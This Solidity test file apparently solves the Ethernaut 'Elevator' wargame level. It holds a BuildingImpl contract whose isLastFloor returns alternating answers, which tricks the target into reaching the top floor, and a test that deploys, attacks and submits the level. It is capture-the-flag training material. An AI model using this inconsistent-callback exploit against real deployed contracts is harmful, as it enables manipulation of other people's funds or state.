pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Elevator/ElevatorFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract BuildingImpl {
    bool x = true;

    function goTo(Elevator elevator) external {
        elevator.goTo(0);
    }

    function isLastFloor(uint) external returns (bool) {
        x = !x;
        return x;
    }
}

contract ElevatorTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testElevatorHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        ElevatorFactory elevatorFactory = new ElevatorFactory();
        ethernaut.registerLevel(elevatorFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(elevatorFactory);
        Elevator ethernautElevator = Elevator(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        BuildingImpl b = new BuildingImpl();
        b.goTo(ethernautElevator);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
